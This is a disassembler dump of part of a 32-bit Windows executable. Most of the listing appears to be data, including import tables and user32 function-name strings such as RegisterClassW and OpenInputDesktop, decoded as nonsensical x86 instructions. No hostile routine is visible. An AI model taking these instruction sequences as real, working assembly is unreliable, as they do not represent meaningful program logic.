  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
  412b26:	gs jbe 0x412b8e
  412b29:	outs   dx,BYTE PTR ds:[esi]
  412b2a:	je     0x412b2c
  412b2c:	cmp    eax,0x65684300
  412b31:	arpl   WORD PTR [ebx+0x52],bp
  412b34:	popa   
  412b35:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  412b3d:	outs   dx,BYTE PTR ds:[esi]
  412b3e:	add    BYTE PTR [eax],al
